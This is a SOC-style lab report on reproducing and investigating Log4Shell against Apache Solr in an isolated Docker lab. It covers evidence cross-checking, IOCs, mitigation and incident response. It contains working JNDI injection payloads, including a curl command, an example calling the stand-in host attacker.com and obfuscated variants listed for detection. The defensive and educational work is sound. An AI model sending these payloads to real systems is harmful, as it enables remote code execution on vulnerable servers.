# Log4Shell Investigation Report (CVE-2021-44228)
Author: Nguyễn Thịnh Hưng
MITRE ATT&CK: T1190 — Exploit Public-Facing Application
Environment: Isolated lab, Docker, Vulhub (log4j/CVE-2021-44228)

---

## 1. Executive Summary

This report describes how the Log4Shell vulnerability (CVE-2021-44228) was reproduced, exploited and investigated. Log4Shell is a Remote Code Execution vulnerability with a perfect CVSS score of 10.0. In an isolated lab running Apache Solr 8.11.0 (Log4j 2.14.1), the author built the environment with Docker, carried out JNDI injection, collected and cross-checked evidence from three independent sources (application logs, a callback listener, and network traffic), built an investigation timeline, and analyzed the incident from a SOC Analyst's perspective: detection strategy, IOCs, detection logic, and an incident response framework. The debugging and the fixing of technical problems that came up along the way are recorded honestly, as part of a real investigation process.

---

## 2. Introduction

### 2.1. Motivation

Log4Shell is one of the most impactful vulnerabilities in modern cybersecurity history, because Log4j is so widespread in the Java ecosystem and the exploitation method is remarkably simple. It is a representative case study for understanding the relationship between programming, logging and network security, three core areas of knowledge for a SOC Analyst.

### 2.2. Objectives

- Understand and explain the technical mechanism of the vulnerability.
- Reproduce the exploitation myself in a safe, isolated environment.
- Practice collecting and cross-checking evidence from multiple data sources.
- Analyze the incident using the mindset and working framework of SOC Tier 1.
- Propose remediation measures and, where conditions allow, verify their effectiveness.

### 2.3. Scope

The lab was carried out entirely in an isolated environment on a personal computer (Windows, Docker Desktop), with no connection to or effect on external systems. The attacker and the victim are the same physical machine, using the loopback address (`127.0.0.1`) to simulate the callback connection. This report does not include a complete RCE implementation (no fake LDAP/HTTP server was set up to serve a Java payload); the scope stops at proving that the JNDI callback succeeds.

---

## 3. Technical Background

### 3.1. Log4j

Apache Log4j is one of the most widely used open-source logging libraries in the Java ecosystem, present in a huge number of enterprise applications.

### 3.2. CVE-2021-44228

Published in December 2021, it affects Log4j from 2.0-beta9 to 2.14.1, with a CVSS score of 10.0/10.0. The severity is at its maximum because exploitation requires no authentication, the impact is enormous (Log4j is embedded indirectly in thousands of software products), and the consequence is the worst possible (RCE, arbitrary code execution).

### 3.3. JNDI

The Java Naming and Directory Interface (JNDI) is an API that lets Java applications look up resources (objects, configuration data) from a directory service over several protocols such as LDAP, RMI and DNS. Log4j supports the `${jndi:...}` syntax in its Lookups feature, which lets Log4j automatically perform a JNDI query as soon as it writes a log message containing this syntax.

### 3.4. Attack Chain

The attack chain begins when the attacker sends a request containing a payload such as `${jndi:ldap://attacker.com:1389/Exploit}`, usually placed in a commonly logged field such as the User-Agent header or any request parameter. When the application logs this value, which is a completely normal action that most web applications perform, Log4j detects the `${...}` syntax and automatically performs a JNDI Lookup. This makes Log4j actively connect to `attacker.com:1389` over the LDAP protocol. In a real attack, the attacker's server would return a reference to a malicious Java class, and Log4j would download and instantiate (that is, execute) that class on the victim machine, leading to Remote Code Execution: the attacker gains the ability to run arbitrary code on the exploited system.

### 3.5. MITRE ATT&CK

This technique is classified as T1190 — Exploit Public-Facing Application, because it exploits a publicly exposed web application (the Solr admin interface) to gain code execution. Since the whole attack chain starts from a single log line, any data field that the application logs (headers, parameters, cookies, and so on) can be an attack vector. This is why the attack surface of this vulnerability is especially wide.

---

## 4. Lab Environment

### 4.1. Architecture

```
Personal computer (Windows + Docker Desktop)
│
├── Container: Apache Solr 8.11.0 (vulnerable application, Log4j 2.14.1)
│     └── Exposes port 8983
│
├── Script: listener.py (simulates the attacker's server, catches the JNDI callback)
│     └── Listens on port 1389
│
└── Wireshark (captures traffic on the loopback interface)
```

### 4.2. Tools

| Tool                    | Role                                                              |
| ----------------------- | ----------------------------------------------------------------- |
| Docker + Docker Compose | Builds the vulnerable application environment (Vulhub)            |
| `curl`                  | Sends the HTTP request containing the exploit payload             |
| Python (socket)         | Self-written script that simulates a server catching the callback |
| Wireshark               | Captures and analyzes network traffic                             |
| PowerShell              | Command-line environment used for all operations                  |

### 4.3. Network Configuration

| Component           | Address/Port           | Role                                                                                                                                               |
| ------------------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| Solr (victim)       | `127.0.0.1:8983`       | Vulnerable web application that receives requests from the "attacker"                                                                              |
| Listener (attacker) | `127.0.0.1:1389`       | Catches the callback connection from the JNDI Lookup                                                                                               |
| Capture interface   | Npcap Loopback Adapter | All traffic happens on the same machine (`127.0.0.1`), so capture must be done on the loopback interface instead of a normal physical network card |

---

## 5. Exploitation

### 5.1. Initial Request

The payload is sent through an arbitrary parameter of the `/solr/admin/cores` endpoint, based on the observation that Solr logs all parameters of every request it receives:

```
curl.exe -g 'http://localhost:8983/solr/admin/cores?foo=${jndi:ldap://127.0.0.1:1389/a}'
```

### 5.2. Payload

```
${jndi:ldap://127.0.0.1:1389/a}
```

The structure has 3 parts: the syntax that triggers the Lookup (`${...}`), the JNDI sub-protocol used (`jndi:ldap`), and the target address (`127.0.0.1:1389/a`).

### 5.3. JNDI Lookup

When Solr logs the `foo` parameter containing the string above, Log4j recognizes the `${jndi:...}` syntax and performs a JNDI lookup over LDAP to the specified address. This is exactly the action observed in Wireshark (a SYN packet sent from Solr to the listener).

### 5.4. Callback

The Python listener confirmed that it received a connection. This proves that Log4j actually executed the lookup, rather than only writing the string to the log as plain text.

### 5.5. Troubleshooting

The process did not succeed the first time. Two technical problems were identified and fixed:

Problem 1 — `curl` URL globbing: The first time, the application log recorded the payload without the opening curly brace (`foo=$jndi:ldap://...`). Cause: by default, `curl` treats `{ }` in a URL as globbing syntax (iterating over a list of URLs) and mishandles the payload automatically. Fixed with the `-g` flag (turns globbing off).

Problem 2 — Listener timing synchronization: The script calls `accept()` only once and then exits. At one point the payload was sent while the listener had not yet been restarted after the previous connection, so the connection was not recorded even though the application log showed the correct request. Fixed by making sure the listener is restarted right before each payload is sent.

---

## 6. Evidence Collection

### 6.1. Application Logs

```
solr-1 | 2026-09-30 04:56:07.430 INFO (qtp3540494-23) [ ] o.a.s.s.HttpSolrCall
[admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://127.0.0.1:1389/a}} status=0 QTime=5
```

[Solr Docker log showing the valid payload](../evidence/screenshots/02-docker-log-success.png)

### 6.2. Network Traffic

Wireshark filter: `tcp.port==1389`

| No.  | Time (s)   | Source    | Destination | Info                                  |
| ---- | ---------- | --------- | ----------- | ------------------------------------- |
| 2168 | 496.809911 | 127.0.0.1 | 127.0.0.1   | 49283 → 1389 \[SYN\] Seq=0            |
| 2169 | 496.809986 | 127.0.0.1 | 127.0.0.1   | 1389 → 49283 \[SYN, ACK\] Seq=0 Ack=1 |
| 2170 | 496.810025 | 127.0.0.1 | 127.0.0.1   | 49283 → 1389 \[ACK\] Seq=1 Ack=1      |
| 2171 | 496.810245 | 127.0.0.1 | 127.0.0.1   | 49283 → 1389 \[FIN, ACK\] Seq=1 Ack=1 |
| 2172 | 496.810266 | 127.0.0.1 | 127.0.0.1   | 1389 → 49283 \[ACK\] Seq=1 Ack=2      |

[Wireshark TCP handshake on port 1389](../evidence/screenshots/04-wireshark-handshake.png)

### 6.3. Listener Logs

The listener's output strings are in Vietnamese without diacritics, kept here exactly as they appeared ("Dang cho ket noi tren port 1389..." means "Waiting for a connection on port 1389...", and "KET NOI TU" means "CONNECTION FROM"):

```
Dang cho ket noi tren port 1389...
KET NOI TU: ('127.0.0.1', 49283)
```

[Python listener receiving the callback connection](../evidence/screenshots/03-python-listener.png)

### 6.4. Cross-validation

Source port `49283` appears consistently in all three independent sources. This is the basis for stating that all three pieces of evidence describe the same event, not coincidental observations. This is the core principle of cross-validation in every real SOC investigation: never draw a conclusion from a single source of evidence.

---

## 7. SOC Investigation

### 7.1. Detection Strategy

An effective detection strategy for Log4Shell should combine several layers, because no single layer is reliable enough on its own:

- **Application log layer:** scan logs for the characteristic string `${jndi:` and its obfuscated variants.
- **Network layer:** monitor unusual outbound connections to LDAP/RMI protocols (ports 389, 1389, 1099 and so on) from application servers. These machines normally have no legitimate reason to initiate LDAP connections to the outside by themselves.

### 7.2. IOC Analysis

| IOC type           | Value                                            | Notes                                                                                        |
| ------------------ | ------------------------------------------------ | -------------------------------------------------------------------------------------------- |
| Payload pattern    | `${jndi:ldap://...}`                             | Real attackers often obfuscate it (for example `${${lower:j}ndi:...}`) to evade simple rules |
| Callback protocol  | LDAP                                             | The most common; RMI and DNS are also used in practice                                       |
| Callback port      | 1389 (lab); 389/1389/1099 are common in practice |                                                                                              |
| Exploited endpoint | `/solr/admin/cores` (parameter `foo`)            | Illustrates that any parameter that gets logged can be a vector                              |

### 7.3. Timeline

| Time (UTC) | Vietnam time (UTC+7) | Event                                                                                         |
| ---------- | -------------------- | --------------------------------------------------------------------------------------------- |
| \~04:50:38 | \~11:50:38           | First attempt: syntax error caused by URL globbing, the lookup was not triggered              |
| \~04:56:07 | \~11:56:07           | Solr logs a request containing the valid payload                                              |
| \~04:56:07 | \~11:56:07           | Log4j performs the JNDI Lookup and opens a TCP connection from port 49283 to `127.0.0.1:1389` |
| \~04:56:07 | \~11:56:07           | The listener confirms it received the connection                                              |
| \~04:56:07 | \~11:56:07           | Wireshark records a full handshake, after which the connection is closed                      |

### 7.4. Attack vs Evidence Mapping

| Step in the Attack Chain (Section 3.4)   | Corresponding evidence            |
| ---------------------------------------- | --------------------------------- |
| A request containing the payload is sent | Application Log (6.1)             |
| Log4j performs the JNDI Lookup           | Network Traffic, SYN packet (6.2) |
| Connection to the attacker's server      | Listener Log (6.3)                |
| (Complete RCE, out of scope)             | No evidence                       |

### 7.5. False Positives

A detection system based on the `${jndi:` pattern can produce false positives in the following cases:

- Legitimate security scanning tools (vulnerability scanners) that send similar payloads on their own to check whether a system is vulnerable. This is authorized activity, not a real attack.
- User input that happens to contain a string resembling the syntax (rare, but it cannot be fully ruled out, for example in technical discussions about this very vulnerability).

An analyst needs to cross-check further: whether the source IP is on the list of known internal scanners, how often the payload is sent, and most importantly, **whether a real outbound connection occurred** (Section 7.1), because a log containing the string alone does not mean the exploitation succeeded.

### 7.6. Investigation Workflow

The investigation process used in this report, which can be generalized to similar incidents:

1. Detect the initial sign (here: carry out the exploitation myself in order to observe it).
2. Collect evidence from multiple independent sources (log, network, endpoint).
3. Cross-validate to confirm that the sources describe the same event.
4. Build the timeline in correct chronological order.
5. Identify IOCs and assess the impact.
6. Propose remediation measures and verify their effectiveness.

---

## 8. Detection Engineering

The core detection logic for this vulnerability is to look for the string `${jndi:` (and common obfuscated variants such as `${${lower:j}ndi:...}`) in any data field that is logged or passed through an HTTP request. This is exactly the payload pattern identified in Section 7.2 (IOC Analysis). Writing concrete detection rules (SIEM or network IDS) and integrating them into a real monitoring system is a direction for future development and is outside the scope of this report (see Section 11, Limitations).

---

## 9. Remediation

### 9.1. Patch

Upgrade to Log4j 2.17.1 or later, the official releases that disable JNDI Lookup by default.

### 9.2. Temporary Mitigation

If patching is not yet possible, set the environment variable or system property `log4j2.formatMsgNoLookups=true` (equivalent to the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`) to turn off the Lookup feature at the configuration level.

### 9.3. Before/After Validation

Status: Performed and verified. The mitigation was set up by adding an environment variable to the lab's `docker-compose.yml`:

```yaml
   environment:
    - LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

After restarting the container (`docker compose up -d`), the exploitation procedure from Section 5 was repeated with exactly the same payload, without changing any detail, to ensure a fair comparison.

Comparison results:

| Item                          | Before the fix                            | After the fix                                                                                             |
| ----------------------------- | ----------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| Solr log                      | Records `${jndi:ldap://127.0.0.1:1389/a}` | Records the identical string (`2026-10-03 11:12:05.607 ... params={foo=${jndi:ldap://127.0.0.1:1389/a}}`) |
| Did Log4j execute the lookup? | Yes                                       | No                                                                                                        |
| Listener                      | Receives a connection `KET NOI TU: (...)` | `KHONG CO KET NOI SAU 15 GIAY` ("no connection after 15 seconds", 15-second timeout)                      |

![Log after the fix: the payload is still recorded as plain text](../evidence/screenshots/05-after-patch-log.png)
![Listener after the fix: no connection received after 15 seconds](../evidence/screenshots/06-after-patch-listener.png)

Analysis: The result confirms the mechanism described in Section 9.2. The `LOG4J_FORMAT_MSG_NO_LOOKUPS` environment variable only disables the **execution** of Lookups, and does not affect the **logging** itself. This is an important technical point: the application still records the payload verbatim (useful for later detection and investigation), but Log4j no longer interprets or executes what is inside `${...}`, so the attack chain is stopped at its very first step.

---

## 10. Incident Response

> This section applies an Incident Response framework (based on the NIST/SANS model) to the lab scenario, to illustrate incident handling thinking. Because the vulnerability was exploited deliberately by the author in a self-built environment (not a real incident that happened unintentionally), the Containment/Eradication/Recovery steps below are **theoretical proposals** for what would be applied if this were a real incident in a production environment, not actions that were carried out.

### 10.1. Identification

**Carried out in practice** (see Sections 6–7): the vulnerability was detected and confirmed through logs, network traffic and the listener callback.

### 10.2. Containment (proposed)

If this were a real incident: isolate the affected host from the network (disconnect it or move it to an isolated VLAN), and block outbound traffic to unknown LDAP/RMI ports at the perimeter firewall.

### 10.3. Eradication (proposed)

Remove or replace the vulnerable Log4j version on the affected host, and review all other systems in the organization that embed the same library (using scanning tools such as `log4j-scanner` or a software inventory, SBOM).

### 10.4. Recovery (proposed)

Restore the service after confirming it has been patched, and monitor more closely during the first period after the system is brought back into operation.

### 10.5. Monitoring (proposed)

Keep monitoring the related IOCs (Section 7.2) for a longer period after the incident, because the attacker may have planted persistence before being detected.

---

## 11. Limitations

- The lab stops at proving that the callback succeeds; a complete RCE was not implemented.
- The attacker and the victim are the same machine (loopback), so an attack over a wide-area network was not fully simulated.
- No real SIEM was integrated to demonstrate automatic alerts; this is the top priority for future development.
- Section 10 is theoretical and illustrative of a working framework, not an account of actions actually taken.

## 12. Lessons Learned

- A convenient feature design can become a serious security risk: Log4j's Lookups feature was designed for convenience (automatically interpolating values when writing logs), but this very automation cannot tell trusted data from user-supplied data. The lesson applies to any system that processes dynamic input.
- A single log line can be both evidence and an attack vector: this is an interesting paradox. The log is where the vulnerability is triggered, and also the main source of evidence for detecting it.
- Familiar tools can have hidden behavior that affects results: the `curl` URL globbing problem is a real example showing the need to understand the tools you use, not just run commands from a ready-made template.
- Cross-checking multiple independent sources of evidence is a principle that cannot be skipped: relying on a single source (for example only the application log) makes it very hard to tell a payload that was merely logged (possibly a false positive) from one that was actually executed.

---

## 13. Conclusion

The lab successfully demonstrated how Log4Shell works from an investigative point of view: setting up the environment, exploiting the vulnerability, collecting and cross-checking evidence from three independent sources, building a timeline, and analyzing the incident within a proper SOC mindset (detection strategy, IOCs, detection logic, incident handling framework). The process of fixing the technical problems that came up is recorded as an inseparable part of a real investigation. It reflects the true nature of security analysis work, which does not always go smoothly by following ready-made instructions.

---

## 14. References

1. Apache Software Foundation. "CVE-2021-44228 Security Advisory." *Apache Logging Services.*
2. MITRE ATT&CK. "T1190 — Exploit Public-Facing Application." *attack.mitre.org.*
3. Vulhub Project. "log4j/CVE-2021-44228." *github.com/vulhub/vulhub.*
4. NIST. "Computer Security Incident Handling Guide (SP 800-61)." Used as the reference framework for Section 10.
5. Professor Messer. "Security Controls — SY0-701." *professormesser.com.*

---

## 15. Appendices

### A. Screenshots

- Image 1: [Solr Admin Dashboard confirming the application is running](../evidence/screenshots/01-solr-dashboard.png)
- Image 2: [Solr Docker log showing the valid payload](../evidence/screenshots/02-docker-log-success.png)
- Image 3: [Python listener window receiving the callback connection](../evidence/screenshots/03-python-listener.png)
- Image 4: [Wireshark, TCP handshake on port 1389](../evidence/screenshots/04-wireshark-handshake.png)
- Image 5: [Log after the fix, the payload is still recorded as plain text](../evidence/screenshots/05-after-patch-log.png)
- Image 6: [Listener after the fix, no connection received](../evidence/screenshots/06-after-patch-listener.png)

### B. PCAP

- [Original Wireshark capture file](../evidence/log4shell-exploit.pcapng)

### C. Logs

- [Full Docker log output produced during the lab](../evidence/solr-full-log.txt)

### D. Source Code

- [Python script used as the callback listener](../lab-setup/listener.py)

### E. Commands

```
docker compose up -d
docker compose logs -f
docker compose logs | Select-String "foo"
curl.exe -g 'http://localhost:8983/solr/admin/cores?foo=${jndi:ldap://127.0.0.1:1389/a}'
python listener.py
```
